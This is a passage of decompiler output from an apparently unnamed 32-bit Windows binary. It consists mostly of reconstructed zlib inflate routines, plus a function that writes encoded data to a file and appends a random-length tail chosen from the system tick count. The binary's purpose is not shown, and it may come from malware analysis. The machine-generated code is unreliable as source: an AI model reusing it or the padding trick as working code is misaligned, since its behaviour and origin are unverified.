undefined4 __thiscall FUN_00404730(void *this,wchar_t *param_1)

{
  void *pvVar1;
  uint in_EAX;
  void *_Str;
  int iVar2;
  void *pvVar3;
  DWORD DVar4;
  DWORD DVar5;
  undefined4 uVar6;
  FILE *local_8;
  void *local_4;
  
  uVar6 = 0;
  local_8 = (FILE *)0x0;
  if ((this == (void *)0x0) || (in_EAX < 10)) {
    return 0xffffffff;
  }
  local_4 = (void *)(in_EAX * 4);
  _Str = _malloc((int)local_4 + 1);
  iVar2 = FUN_004045b0(in_EAX,&local_4,this,_Str);
  if (iVar2 == 0) {
    uVar6 = 0xfffffffd;
  }
  else {
    __wfopen_s(&local_8,param_1,L"wb");
    pvVar1 = local_4;
    if (local_8 == (FILE *)0x0) {
      uVar6 = 0xfffffffe;
      goto LAB_004047d0;
    }
    pvVar3 = (void *)_fwrite(_Str,1,(size_t)local_4,local_8);
    if (pvVar3 == pvVar1) {
      DVar4 = GetTickCount();
      DVar5 = GetTickCount();
      _fwrite((void *)(DVar5 % 1000 + (int)_Str),1,DVar4 % 500,local_8);
    }
    else {
      uVar6 = 0xfffffffe;
    }
  }
  if (local_8 != (FILE *)0x0) {
    _fclose(local_8);
  }
LAB_004047d0:
  if (_Str != (void *)0x0) {
    _free(_Str);
  }
  return uVar6;
}



int __cdecl FUN_00404830(int param_1)

{
  uint uVar1;
  undefined4 uVar2;
  int unaff_EBX;
  void *_Src;
  int unaff_ESI;
  void *pvVar3;
  uint uVar4;
  void *local_4;
  
  local_4 = *(void **)(unaff_EBX + 0xc);
  _Src = *(void **)(unaff_ESI + 0x30);
  pvVar3 = *(void **)(unaff_ESI + 0x34);
  if (pvVar3 < _Src) {
    pvVar3 = *(void **)(unaff_ESI + 0x2c);
  }
  uVar1 = *(uint *)(unaff_EBX + 0x10);
  uVar4 = (int)pvVar3 - (int)_Src;
  if (uVar1 < (uint)((int)pvVar3 - (int)_Src)) {
    uVar4 = uVar1;
  }
  if ((uVar4 != 0) && (param_1 == -5)) {
    param_1 = 0;
  }
  *(int *)(unaff_EBX + 0x14) = *(int *)(unaff_EBX + 0x14) + uVar4;
  *(uint *)(unaff_EBX + 0x10) = uVar1 - uVar4;
  if (*(code **)(unaff_ESI + 0x38) != (code *)0x0) {
    uVar2 = (**(code **)(unaff_ESI + 0x38))(*(undefined4 *)(unaff_ESI + 0x3c),_Src,uVar4);
    *(undefined4 *)(unaff_ESI + 0x3c) = uVar2;
    *(undefined4 *)(unaff_EBX + 0x30) = uVar2;
  }
  if (uVar4 != 0) {
    _memcpy(local_4,_Src,uVar4);
    local_4 = (void *)((int)local_4 + uVar4);
    _Src = (void *)((int)_Src + uVar4);
  }
  if (_Src == *(void **)(unaff_ESI + 0x2c)) {
    _Src = *(void **)(unaff_ESI + 0x28);
    if (*(void **)(unaff_ESI + 0x34) == *(void **)(unaff_ESI + 0x2c)) {
      *(void **)(unaff_ESI + 0x34) = _Src;
    }
    uVar1 = *(uint *)(unaff_EBX + 0x10);
    uVar4 = *(int *)(unaff_ESI + 0x34) - (int)_Src;
    if (uVar1 < uVar4) {
      uVar4 = uVar1;
    }
    if ((uVar4 != 0) && (param_1 == -5)) {
      param_1 = 0;
    }
    *(int *)(unaff_EBX + 0x14) = *(int *)(unaff_EBX + 0x14) + uVar4;
    *(uint *)(unaff_EBX + 0x10) = uVar1 - uVar4;
    if (*(code **)(unaff_ESI + 0x38) != (code *)0x0) {
      uVar2 = (**(code **)(unaff_ESI + 0x38))(*(undefined4 *)(unaff_ESI + 0x3c),_Src,uVar4);
      *(undefined4 *)(unaff_ESI + 0x3c) = uVar2;
      *(undefined4 *)(unaff_EBX + 0x30) = uVar2;
    }
    if (uVar4 != 0) {
      _memcpy(local_4,_Src,uVar4);
      local_4 = (void *)((int)local_4 + uVar4);
      _Src = (void *)((int)_Src + uVar4);
    }
  }
  *(void **)(unaff_EBX + 0xc) = local_4;
  *(void **)(unaff_ESI + 0x30) = _Src;
  return param_1;
}



void __cdecl FUN_00404920(undefined param_1,undefined param_2,undefined4 param_3,undefined4 param_4)

{
  int in_EAX;
  undefined4 *puVar1;
  
  puVar1 = (undefined4 *)(**(code **)(in_EAX + 0x20))(*(undefined4 *)(in_EAX + 0x28),1,0x1a);
  if (puVar1 != (undefined4 *)0x0) {
    *(undefined *)(puVar1 + 4) = param_1;
    *(undefined *)((int)puVar1 + 0x11) = param_2;
    *puVar1 = 0;
    *(undefined4 *)((int)puVar1 + 0x12) = param_3;
    *(undefined4 *)((int)puVar1 + 0x16) = param_4;
  }
  return;
}



void __thiscall FUN_00404960(void *this,int param_1)

{
  byte bVar1;
  int *piVar2;
  int iVar3;
  undefined *puVar4;
  byte **in_EAX;
  uint uVar5;
  undefined *puVar6;
  undefined *puVar7;
  byte *pbVar8;
  uint uVar9;
  uint local_1c;
  byte *local_14;
  undefined *local_10;
  byte *local_c;
  undefined *local_8;
  
  local_1c = *(uint *)((int)this + 0x20);
  piVar2 = *(int **)((int)this + 4);
  local_14 = in_EAX[1];
  pbVar8 = *in_EAX;
  puVar7 = *(undefined **)((int)this + 0x34);
  uVar9 = *(uint *)((int)this + 0x1c);
  if (puVar7 < *(undefined **)((int)this + 0x30)) {
    local_10 = *(undefined **)((int)this + 0x30) + (-1 - (int)puVar7);
  }
  else {
    local_10 = (undefined *)(*(int *)((int)this + 0x2c) - (int)puVar7);
  }
  iVar3 = *piVar2;
  do {
    puVar6 = puVar7;
    switch(iVar3) {
    case 0:
      if ((local_10 < (undefined *)0x102) || (local_14 < (byte *)0xa)) {
LAB_00404a50:
        piVar2[3] = (uint)*(byte *)(piVar2 + 4);
        piVar2[2] = *(int *)((int)piVar2 + 0x12);
        *piVar2 = 1;
        goto switchD_004049a8_caseD_1;
      }
      *(uint *)((int)this + 0x20) = local_1c;
      *(uint *)((int)this + 0x1c) = uVar9;
      in_EAX[1] = local_14;
      in_EAX[2] = in_EAX[2] + ((int)pbVar8 - (int)*in_EAX);
      *in_EAX = pbVar8;
      *(undefined **)((int)this + 0x34) = puVar7;
      param_1 = FUN_00406230((uint)*(byte *)(piVar2 + 4),(uint)*(byte *)((int)piVar2 + 0x11),
                             *(int *)((int)piVar2 + 0x12),*(int *)((int)piVar2 + 0x16),(int)this,
                             in_EAX);
      local_14 = in_EAX[1];
      local_1c = *(uint *)((int)this + 0x20);
      pbVar8 = *in_EAX;
      uVar9 = *(uint *)((int)this + 0x1c);
      puVar7 = *(undefined **)((int)this + 0x34);
      if (puVar7 < *(undefined **)((int)this + 0x30)) {
        local_10 = *(undefined **)((int)this + 0x30) + (-1 - (int)puVar7);
      }
      else {
        local_10 = (undefined *)(*(int *)((int)this + 0x2c) - (int)puVar7);
      }
      if (param_1 == 0) goto LAB_00404a50;
      *piVar2 = (uint)(param_1 != 1) * 2 + 7;
      goto LAB_00404e97;
    case 1:
switchD_004049a8_caseD_1:
      for (; uVar9 < (uint)piVar2[3]; uVar9 = uVar9 + 8) {
        if (local_14 == (byte *)0x0) {
LAB_00404ed5:
          *(uint *)((int)this + 0x20) = local_1c;
          *(uint *)((int)this + 0x1c) = uVar9;
          in_EAX[1] = (byte *)0x0;
          in_EAX[2] = in_EAX[2] + ((int)pbVar8 - (int)*in_EAX);
          *in_EAX = pbVar8;
          *(undefined **)((int)this + 0x34) = puVar7;
          FUN_00404830(param_1);
          return;
        }
        bVar1 = *pbVar8;
        local_14 = local_14 + -1;
        pbVar8 = pbVar8 + 1;
        param_1 = 0;
        local_1c = local_1c | (uint)bVar1 << ((byte)uVar9 & 0x1f);
      }
      local_c = (byte *)(piVar2[2] + (*(uint *)(&DAT_00427370 + piVar2[3] * 4) & local_1c) * 8);
      local_1c = local_1c >> (local_c[1] & 0x1f);
      uVar9 = uVar9 - local_c[1];
      bVar1 = *local_c;
      uVar5 = (uint)bVar1;
      if (uVar5 == 0) {
        piVar2[2] = *(int *)(local_c + 4);
        *piVar2 = 6;
        goto LAB_00404e97;
      }
      if ((bVar1 & 0x10) != 0) {
        piVar2[2] = uVar5 & 0xf;
        piVar2[1] = *(int *)(local_c + 4);
        *piVar2 = 2;
        goto LAB_00404e97;
      }
      if ((bVar1 & 0x40) == 0) goto LAB_00404b23;
      if ((bVar1 & 0x20) != 0) {
        *piVar2 = 7;
        goto LAB_00404e97;
      }
      *piVar2 = 9;
      in_EAX[6] = (byte *)"invalid literal/length code";
      param_1 = -3;
      goto LAB_00404ea8;
    case 2:
      uVar5 = piVar2[2];
      for (; uVar9 < uVar5; uVar9 = uVar9 + 8) {
        if (local_14 == (byte *)0x0) goto LAB_00404ed5;
        bVar1 = *pbVar8;
        local_14 = local_14 + -1;
        pbVar8 = pbVar8 + 1;
        param_1 = 0;
        local_1c = local_1c | (uint)bVar1 << ((byte)uVar9 & 0x1f);
      }
      piVar2[1] = piVar2[1] + (*(uint *)(&DAT_00427370 + uVar5 * 4) & local_1c);
      local_1c = local_1c >> ((byte)uVar5 & 0x1f);
      uVar9 = uVar9 - uVar5;
      piVar2[3] = (uint)*(byte *)((int)piVar2 + 0x11);
      piVar2[2] = *(int *)((int)piVar2 + 0x16);
      *piVar2 = 3;
      break;
    case 3:
      break;
    case 4:
      uVar5 = piVar2[2];
      for (; uVar9 < uVar5; uVar9 = uVar9 + 8) {
        if (local_14 == (byte *)0x0) goto LAB_00404ed5;
        bVar1 = *pbVar8;
        local_14 = local_14 + -1;
        pbVar8 = pbVar8 + 1;
        param_1 = 0;
        local_1c = local_1c | (uint)bVar1 << ((byte)uVar9 & 0x1f);
      }
      piVar2[3] = piVar2[3] + (*(uint *)(&DAT_00427370 + uVar5 * 4) & local_1c);
      local_1c = local_1c >> ((byte)uVar5 & 0x1f);
      uVar9 = uVar9 - uVar5;
      *piVar2 = 5;
    case 5:
      local_8 = puVar7 + -piVar2[3];
      if (local_8 < *(undefined **)((int)this + 0x28)) {
        do {
          local_8 = local_8 + (*(int *)((int)this + 0x2c) - (int)*(undefined **)((int)this + 0x28));
        } while (local_8 < *(undefined **)((int)this + 0x28));
      }
      iVar3 = piVar2[1];
      while (iVar3 != 0) {
        puVar6 = puVar7;
        if (local_10 == (undefined *)0x0) {
          if (puVar7 == *(undefined **)((int)this + 0x2c)) {
            local_10 = *(undefined **)((int)this + 0x30);
            puVar6 = *(undefined **)((int)this + 0x28);
            if (local_10 != puVar6) {
              if (puVar6 < local_10) {
                local_10 = local_10 + (-1 - (int)puVar6);
              }
              else {
                local_10 = (undefined *)(*(int *)((int)this + 0x2c) - (int)puVar6);
              }
              puVar7 = puVar6;
              if (local_10 != (undefined *)0x0) goto LAB_00404dad;
            }
          }
          *(undefined **)((int)this + 0x34) = puVar7;
          param_1 = FUN_00404830(param_1);
          puVar6 = *(undefined **)((int)this + 0x34);
          if (puVar6 < *(undefined **)((int)this + 0x30)) {
            local_10 = *(undefined **)((int)this + 0x30) + (-1 - (int)puVar6);
          }
          else {
            local_10 = (undefined *)(*(int *)((int)this + 0x2c) - (int)puVar6);
          }
          if (puVar6 == *(undefined **)((int)this + 0x2c)) {
            puVar7 = *(undefined **)((int)this + 0x28);
            puVar4 = *(undefined **)((int)this + 0x30);
            if (puVar4 != puVar7) {
              puVar6 = puVar7;
              if (puVar7 < puVar4) {
                local_10 = puVar4 + (-1 - (int)puVar7);
              }
              else {
                local_10 = (undefined *)(*(int *)((int)this + 0x2c) - (int)puVar7);
              }
            }
          }
          if (local_10 == (undefined *)0x0) goto LAB_00404f18;
        }
LAB_00404dad:
        *puVar6 = *local_8;
        local_8 = local_8 + 1;
        local_10 = local_10 + -1;
        puVar7 = puVar6 + 1;
        param_1 = 0;
        if (local_8 == *(undefined **)((int)this + 0x2c)) {
          local_8 = *(undefined **)((int)this + 0x28);
        }
        piVar2[1] = piVar2[1] + -1;
        iVar3 = piVar2[1];
      }
LAB_00404e91:
      *piVar2 = 0;
      goto LAB_00404e97;
    case 6:
      if (local_10 == (undefined *)0x0) {
        if (puVar7 == *(undefined **)((int)this + 0x2c)) {
          local_10 = *(undefined **)((int)this + 0x30);
          puVar6 = *(undefined **)((int)this + 0x28);
          if (local_10 != puVar6) {
            if (puVar6 < local_10) {
              local_10 = local_10 + (-1 - (int)puVar6);
            }
            else {
              local_10 = (undefined *)(*(int *)((int)this + 0x2c) - (int)puVar6);
            }
            puVar7 = puVar6;
            if (local_10 != (undefined *)0x0) goto LAB_00404e76;
          }
        }
        *(undefined **)((int)this + 0x34) = puVar7;
        param_1 = FUN_00404830(param_1);
        puVar6 = *(undefined **)((int)this + 0x34);
        if (puVar6 < *(undefined **)((int)this + 0x30)) {
          local_10 = *(undefined **)((int)this + 0x30) + (-1 - (int)puVar6);
        }
        else {
          local_10 = (undefined *)(*(int *)((int)this + 0x2c) - (int)puVar6);
        }
        if (puVar6 == *(undefined **)((int)this + 0x2c)) {
          puVar7 = *(undefined **)((int)this + 0x28);
          puVar4 = *(undefined **)((int)this + 0x30);
          if (puVar4 != puVar7) {
            puVar6 = puVar7;
            if (puVar7 < puVar4) {
              local_10 = puVar4 + (-1 - (int)puVar7);
            }
            else {
              local_10 = (undefined *)(*(int *)((int)this + 0x2c) - (int)puVar7);
            }
          }
        }
        if (local_10 == (undefined *)0x0) {
LAB_00404f18:
          *(uint *)((int)this + 0x20) = local_1c;
          *(uint *)((int)this + 0x1c) = uVar9;
          in_EAX[1] = local_14;
          in_EAX[2] = in_EAX[2] + ((int)pbVar8 - (int)*in_EAX);
          goto LAB_00404ec0;
        }
      }
LAB_00404e76:
      *puVar6 = *(undefined *)(piVar2 + 2);
      puVar7 = puVar6 + 1;
      local_10 = local_10 + -1;
      param_1 = 0;
      goto LAB_00404e91;
    case 7:
      if (7 < uVar9) {
        local_14 = local_14 + 1;
        uVar9 = uVar9 - 8;
        pbVar8 = pbVar8 + -1;
      }
      *(undefined **)((int)this + 0x34) = puVar7;
      param_1 = FUN_00404830(param_1);
      puVar7 = *(undefined **)((int)this + 0x34);
      if (*(undefined **)((int)this + 0x30) == puVar7) {
        *piVar2 = 8;
switchD_004049a8_caseD_8:
        param_1 = 1;
LAB_00404ea8:
        *(uint *)((int)this + 0x20) = local_1c;
        *(uint *)((int)this + 0x1c) = uVar9;
        in_EAX[1] = local_14;
      }
      else {
        *(uint *)((int)this + 0x20) = local_1c;
        *(uint *)((int)this + 0x1c) = uVar9;
        in_EAX[1] = local_14;
      }
      in_EAX[2] = in_EAX[2] + ((int)pbVar8 - (int)*in_EAX);
      puVar6 = puVar7;
LAB_00404ec0:
      *in_EAX = pbVar8;
      *(undefined **)((int)this + 0x34) = puVar6;
      FUN_00404830(param_1);
      return;
    case 8:
      goto switchD_004049a8_caseD_8;
    case 9:
      *(uint *)((int)this + 0x20) = local_1c;
      *(uint *)((int)this + 0x1c) = uVar9;
      in_EAX[1] = local_14;
      in_EAX[2] = in_EAX[2] + ((int)pbVar8 - (int)*in_EAX);
      param_1 = -3;
      goto LAB_00404ec0;
    default:
      param_1 = -2;
      goto LAB_00404ea8;
    }
    for (; uVar9 < (uint)piVar2[3]; uVar9 = uVar9 + 8) {
      if (local_14 == (byte *)0x0) goto LAB_00404ed5;
      bVar1 = *pbVar8;
      local_14 = local_14 + -1;
      pbVar8 = pbVar8 + 1;
      param_1 = 0;
      local_1c = local_1c | (uint)bVar1 << ((byte)uVar9 & 0x1f);
    }
    local_c = (byte *)(piVar2[2] + (*(uint *)(&DAT_00427370 + piVar2[3] * 4) & local_1c) * 8);
    local_1c = local_1c >> (local_c[1] & 0x1f);
    bVar1 = *local_c;
    uVar5 = (uint)bVar1;
    uVar9 = uVar9 - local_c[1];
    if ((bVar1 & 0x10) == 0) {
      if ((bVar1 & 0x40) != 0) {
        *piVar2 = 9;
        in_EAX[6] = (byte *)"invalid distance code";
        param_1 = -3;
        goto LAB_00404ea8;
      }
LAB_00404b23:
      piVar2[3] = uVar5;
      piVar2[2] = (int)(local_c + *(int *)(local_c + 4) * 8);
    }
    else {
      piVar2[2] = uVar5 & 0xf;
      piVar2[3] = *(int *)(local_c + 4);
      *piVar2 = 4;
    }
LAB_00404e97:
    iVar3 = *piVar2;
  } while( true );
}



void FUN_00404fd0(void)

{
  int *in_EAX;
  int iVar1;
  int *unaff_ESI;
  int unaff_EDI;
  
  if (in_EAX != (int *)0x0) {
    *in_EAX = unaff_ESI[0xf];
  }
  if ((*unaff_ESI == 4) || (*unaff_ESI == 5)) {
    (**(code **)(unaff_EDI + 0x24))(*(undefined4 *)(unaff_EDI + 0x28),unaff_ESI[3]);
  }
  if (*unaff_ESI == 6) {
    (**(code **)(unaff_EDI + 0x24))(*(undefined4 *)(unaff_EDI + 0x28),unaff_ESI[1]);
  }
  unaff_ESI[0xd] = unaff_ESI[10];
  unaff_ESI[0xc] = unaff_ESI[10];
  *unaff_ESI = 0;
  unaff_ESI[7] = 0;
  unaff_ESI[8] = 0;
  if ((code *)unaff_ESI[0xe] != (code *)0x0) {
    iVar1 = (*(code *)unaff_ESI[0xe])(0,0,0);
    unaff_ESI[0xf] = iVar1;
    *(int *)(unaff_EDI + 0x30) = iVar1;
  }
  return;
}



undefined4 * __cdecl FUN_00405040(undefined4 param_1)

{
  int in_EAX;
  undefined4 *puVar1;
  int iVar2;
  int unaff_EBX;
  
  puVar1 = (undefined4 *)(**(code **)(in_EAX + 0x20))(*(undefined4 *)(in_EAX + 0x28),1,0x40);
  if (puVar1 != (undefined4 *)0x0) {
    iVar2 = (**(code **)(in_EAX + 0x20))(*(undefined4 *)(in_EAX + 0x28),8,0x5a0);
    puVar1[9] = iVar2;
    if (iVar2 != 0) {
      iVar2 = (**(code **)(in_EAX + 0x20))(*(undefined4 *)(in_EAX + 0x28),1);
      puVar1[10] = iVar2;
      if (iVar2 == 0) {
        (**(code **)(in_EAX + 0x24))(*(undefined4 *)(in_EAX + 0x28),puVar1[9]);
        (**(code **)(in_EAX + 0x24))(*(undefined4 *)(in_EAX + 0x28),puVar1);
        return (undefined4 *)0x0;
      }
      puVar1[0xb] = iVar2 + unaff_EBX;
      puVar1[0xe] = param_1;
      *puVar1 = 0;
      FUN_00404fd0();
      return puVar1;
    }
    (**(code **)(in_EAX + 0x24))(*(undefined4 *)(in_EAX + 0x28),puVar1);
  }
  return (undefined4 *)0x0;
}



// WARNING: Type propagation algorithm not settling

void __thiscall FUN_004050e0(void *this,int param_1)

{
  int *piVar1;
  byte bVar2;
  byte *pbVar3;
  byte *pbVar4;
  byte **in_EAX;
  uint uVar5;
  uint uVar6;
  undefined4 uVar7;
  undefined4 *puVar8;
  int iVar9;
  byte bVar10;
  uint uVar11;
  byte *_Src;
  uint uVar12;
  uint local_28;
  byte *local_24;
  byte *local_20;
  byte *local_1c;
  byte *local_18;
  int local_14;
  uint local_10;
  uint local_c;
  int local_8;
  int local_4;
  
  pbVar3 = *(byte **)((int)this + 0x34);
  local_20 = in_EAX[1];
  _Src = *in_EAX;
  uVar12 = *(uint *)((int)this + 0x1c);
  if (pbVar3 < *(byte **)((int)this + 0x30)) {
    local_18 = *(byte **)((int)this + 0x30) + (-1 - (int)pbVar3);
  }
  else {
    local_18 = (byte *)(*(int *)((int)this + 0x2c) - (int)pbVar3);
  }
                    // WARNING: Load size is inaccurate
  uVar11 = *this;
  uVar6 = *(uint *)((int)this + 0x20);
  uVar5 = *(uint *)((int)this + 0x20);
  do {
    local_28 = uVar5;
    local_24 = pbVar3;
    if (9 < uVar11) {
      param_1 = -2;
LAB_0040512f:
      *(uint *)((int)this + 0x20) = local_28;
LAB_00405136:
      *(uint *)((int)this + 0x1c) = uVar12;
      in_EAX[1] = local_20;
LAB_00405140:
      pbVar3 = *in_EAX;
      *in_EAX = _Src;
      in_EAX[2] = in_EAX[2] + ((int)_Src - (int)pbVar3);
      *(byte **)((int)this + 0x34) = local_24;
      FUN_00404830(param_1);
      return;
    }
    switch((&switchD_00405164::switchdataD_00405acc)[uVar11]) {
    case (undefined *)0x40516b:
      iVar9 = param_1;
      for (; uVar5 = uVar6, uVar12 < 3; uVar12 = uVar12 + 8) {
        if (local_20 == (byte *)0x0) {
          *(uint *)((int)this + 0x20) = local_28;
          *(uint *)((int)this + 0x1c) = uVar12;
          in_EAX[1] = (byte *)0x0;
          goto LAB_0040581f;
        }
        bVar2 = *_Src;
        local_20 = local_20 + -1;
        _Src = _Src + 1;
        param_1 = 0;
        local_28 = uVar5 | (uint)bVar2 << ((byte)uVar12 & 0x1f);
        uVar6 = local_28;
        iVar9 = param_1;
      }
      *(uint *)((int)this + 0x18) = uVar5 & 1;
      param_1 = iVar9;
      switch((uVar5 & 7) >> 1) {
      case 0:
        uVar11 = uVar12 - 3 & 7;
        uVar5 = (uVar5 >> 3) >> (sbyte)uVar11;
        uVar12 = (uVar12 - 3) - uVar11;
        *(undefined4 *)this = 1;
        local_28 = uVar5;
        break;
      case 1:
        iVar9 = FUN_00404920(9,5,&DAT_004273b8,&DAT_004283b8);
        *(int *)((int)this + 4) = iVar9;
        if (iVar9 == 0) {
          param_1 = -4;
          goto LAB_0040512f;
        }
        uVar5 = local_28 >> 3;
        uVar12 = uVar12 - 3;
        *(undefined4 *)this = 6;
        local_28 = uVar5;
        break;
      case 2:
        uVar5 = uVar5 >> 3;
        uVar12 = uVar12 - 3;
        *(undefined4 *)this = 3;
        local_28 = uVar5;
        break;
      case 3:
        *(undefined4 *)this = 9;
        in_EAX[6] = (byte *)"invalid block type";
        *(uint *)((int)this + 0x20) = local_28 >> 3;
        uVar12 = uVar12 - 3;
        param_1 = -3;
        goto LAB_00405136;
      }
      break;
    case (undefined *)0x405226:
      for (; uVar12 < 0x20; uVar12 = uVar12 + 8) {
        if (local_20 == (byte *)0x0) goto LAB_00405868;
        bVar2 = *_Src;
        local_20 = local_20 + -1;
        _Src = _Src + 1;
        param_1 = 0;
        uVar6 = uVar6 | (uint)bVar2 << ((byte)uVar12 & 0x1f);
        local_28 = uVar6;
      }
      uVar11 = uVar6 & 0xffff;
      if (~uVar6 >> 0x10 != uVar11) {
        *(undefined4 *)this = 9;
        in_EAX[6] = (byte *)"invalid stored block lengths";
        goto switchD_00405164_caseD_405890;
      }
      uVar5 = 0;
      uVar12 = 0;
      *(uint *)((int)this + 4) = uVar11;
      local_28 = 0;
      if (uVar11 == 0) {
        *(uint *)this = -(uint)(*(int *)((int)this + 0x18) != 0) & 7;
      }
      else {
        *(undefined4 *)this = 2;
      }
      break;
    case (undefined *)0x40529a:
      if (local_20 == (byte *)0x0) {
LAB_004058c3:
        *(uint *)((int)this + 0x20) = local_28;
        *(uint *)((int)this + 0x1c) = uVar12;
        in_EAX[1] = (byte *)0x0;
        in_EAX[2] = in_EAX[2] + ((int)_Src - (int)*in_EAX);
        *in_EAX = _Src;
        *(byte **)((int)this + 0x34) = pbVar3;
        FUN_00404830(param_1);
        return;
      }
      if (local_18 == (byte *)0x0) {
        local_18 = (byte *)0x0;
        if (pbVar3 == *(byte **)((int)this + 0x2c)) {
          pbVar4 = *(byte **)((int)this + 0x30);
          local_24 = *(byte **)((int)this + 0x28);
          if (local_24 != pbVar4) {
            if (local_24 < pbVar4) {
              local_18 = pbVar4 + (-1 - (int)local_24);
            }
            else {
              local_18 = *(byte **)((int)this + 0x2c) + -(int)local_24;
            }
            pbVar3 = local_24;
            if (local_18 != (byte *)0x0) goto LAB_00405347;
          }
        }
        local_24 = pbVar3;
        *(byte **)((int)this + 0x34) = local_24;
        iVar9 = FUN_00404830(param_1);
        pbVar3 = *(byte **)((int)this + 0x30);
        local_24 = *(byte **)((int)this + 0x34);
        if (local_24 < pbVar3) {
          local_18 = pbVar3 + (-1 - (int)local_24);
        }
        else {
          local_18 = (byte *)(*(int *)((int)this + 0x2c) - (int)local_24);
        }
        if (local_24 == *(byte **)((int)this + 0x2c)) {
          pbVar4 = *(byte **)((int)this + 0x28);
          if (pbVar4 != pbVar3) {
            local_24 = pbVar4;
            if (pbVar4 < pbVar3) {
              local_18 = pbVar3 + (-1 - (int)pbVar4);
            }
            else {
              local_18 = (byte *)(*(int *)((int)this + 0x2c) - (int)pbVar4);
            }
          }
        }
        if (local_18 == (byte *)0x0) {
          *(uint *)((int)this + 0x20) = uVar5;
          *(uint *)((int)this + 0x1c) = uVar12;
          in_EAX[1] = local_20;
          goto LAB_0040581f;
        }
      }
LAB_00405347:
      param_1 = 0;
      local_1c = *(byte **)((int)this + 4);
      if (local_20 < *(byte **)((int)this + 4)) {
        local_1c = local_20;
      }
      if (local_18 < local_1c) {
        local_1c = local_18;
      }
      _memcpy(local_24,_Src,(size_t)local_1c);
      local_20 = local_20 + -(int)local_1c;
      local_24 = local_24 + (int)local_1c;
      local_18 = local_18 + -(int)local_1c;
      _Src = _Src + (int)local_1c;
      piVar1 = (int *)((int)this + 4);
      *piVar1 = *piVar1 - (int)local_1c;
      if (*piVar1 == 0) {
        *(uint *)this = -(uint)(*(int *)((int)this + 0x18) != 0) & 7;
      }
      break;
    case (undefined *)0x4053af:
      for (; uVar12 < 0xe; uVar12 = uVar12 + 8) {
        if (local_20 == (byte *)0x0) goto LAB_004058c3;
        bVar2 = *_Src;
        local_20 = local_20 + -1;
        _Src = _Src + 1;
        param_1 = 0;
        uVar6 = uVar6 | (uint)bVar2 << ((byte)uVar12 & 0x1f);
        local_28 = uVar6;
      }
      *(uint *)((int)this + 4) = uVar6 & 0x3fff;
      if ((0x1d < (uVar6 & 0x1f)) || (uVar11 = (uVar6 & 0x3fff) >> 5 & 0x1f, 0x1d < uVar11)) {
        *(undefined4 *)this = 9;
        in_EAX[6] = (byte *)"too many length or distance symbols";
        goto switchD_00405164_caseD_405890;
      }
      iVar9 = (*(code *)in_EAX[8])(in_EAX[10],uVar11 + 0x102 + (uVar6 & 0x1f),4);
      *(int *)((int)this + 0xc) = iVar9;
      if (iVar9 == 0) {
        *(uint *)((int)this + 0x20) = local_28;
        *(uint *)((int)this + 0x1c) = uVar12;
        in_EAX[1] = local_20;
        in_EAX[2] = in_EAX[2] + ((int)_Src - (int)*in_EAX);
        *in_EAX = _Src;
        *(byte **)((int)this + 0x34) = pbVar3;
        FUN_00404830(-4);
        return;
      }
      uVar6 = local_28 >> 0xe;
      uVar12 = uVar12 - 0xe;
      *(undefined4 *)((int)this + 8) = 0;
      *(undefined4 *)this = 4;
      local_28 = uVar6;
    case (undefined *)0x405441:
      if (*(uint *)((int)this + 8) < (*(uint *)((int)this + 4) >> 10) + 4) {
        do {
          for (; uVar12 < 3; uVar12 = uVar12 + 8) {
            if (local_20 == (byte *)0x0) goto LAB_004058c3;
            bVar2 = *_Src;
            local_20 = local_20 + -1;
            _Src = _Src + 1;
            param_1 = 0;
            local_28 = uVar6 | (uint)bVar2 << ((byte)uVar12 & 0x1f);
            uVar6 = local_28;
          }
          *(uint *)(*(int *)((int)this + 0xc) +
                   *(int *)(&DAT_004284b8 + *(int *)((int)this + 8) * 4) * 4) = uVar6 & 7;
          *(int *)((int)this + 8) = *(int *)((int)this + 8) + 1;
          local_28 = local_28 >> 3;
          uVar12 = uVar12 - 3;
          uVar6 = local_28;
        } while (*(uint *)((int)this + 8) < (*(uint *)((int)this + 4) >> 10) + 4);
      }
      uVar11 = *(uint *)((int)this + 8);
      while (uVar11 < 0x13) {
        *(undefined4 *)
         (*(int *)((int)this + 0xc) + *(int *)(&DAT_004284b8 + *(int *)((int)this + 8) * 4) * 4) = 0
        ;
        *(int *)((int)this + 8) = *(int *)((int)this + 8) + 1;
        uVar11 = *(uint *)((int)this + 8);
      }
      *(int *)((int)this + 0x10) = 7;
      iVar9 = FUN_00406010(*(void **)((int)this + 0xc),(int *)((int)this + 0x10),
                           (int *)((int)this + 0x14),*(int *)((int)this + 0x24));
      if (iVar9 != 0) {
        if (iVar9 == -3) {
          (*(code *)in_EAX[9])(in_EAX[10],*(undefined4 *)((int)this + 0xc));
          *(undefined4 *)this = 9;
        }
        *(uint *)((int)this + 0x20) = local_28;
        *(uint *)((int)this + 0x1c) = uVar12;
        in_EAX[1] = local_20;
LAB_0040581f:
        pbVar3 = *in_EAX;
        *in_EAX = _Src;
        in_EAX[2] = in_EAX[2] + ((int)_Src - (int)pbVar3);
        *(byte **)((int)this + 0x34) = local_24;
        FUN_00404830(iVar9);
        return;
      }
      *(undefined4 *)((int)this + 8) = 0;
      *(undefined4 *)this = 5;
      uVar6 = local_28;
switchD_00405164_caseD_405514:
      if (*(uint *)((int)this + 8) <
          (*(uint *)((int)this + 4) >> 5 & 0x1f) + 0x102 + (*(uint *)((int)this + 4) & 0x1f)) {
        do {
          uVar11 = *(uint *)((int)this + 0x10);
          if (uVar12 < uVar11) {
            do {
              if (local_20 == (byte *)0x0) goto LAB_004058c3;
              bVar2 = *_Src;
              local_20 = local_20 + -1;
              bVar10 = (byte)uVar12;
              uVar11 = *(uint *)((int)this + 0x10);
              uVar12 = uVar12 + 8;
              _Src = _Src + 1;
              uVar6 = uVar6 | (uint)bVar2 << (bVar10 & 0x1f);
              param_1 = 0;
              local_28 = uVar6;
            } while (uVar12 < uVar11);
          }
          iVar9 = *(int *)((int)this + 0x14) + (*(uint *)(&DAT_00427370 + uVar11 * 4) & uVar6) * 8;
          bVar2 = *(byte *)(iVar9 + 1);
          uVar11 = (uint)bVar2;
          local_c = *(uint *)(iVar9 + 4);
          if (local_c < 0x10) {
            local_28 = uVar6 >> (bVar2 & 0x1f);
            uVar12 = uVar12 - uVar11;
            *(uint *)(*(int *)((int)this + 0xc) + *(int *)((int)this + 8) * 4) = local_c;
            *(int *)((int)this + 8) = *(int *)((int)this + 8) + 1;
          }
          else {
            if (local_c == 0x12) {
              local_14 = 7;
            }
            else {
              local_14 = local_c - 0xe;
            }
            local_18 = (byte *)((uint)(local_c == 0x12) * 8 + 3);
            local_10 = uVar11 + local_14;
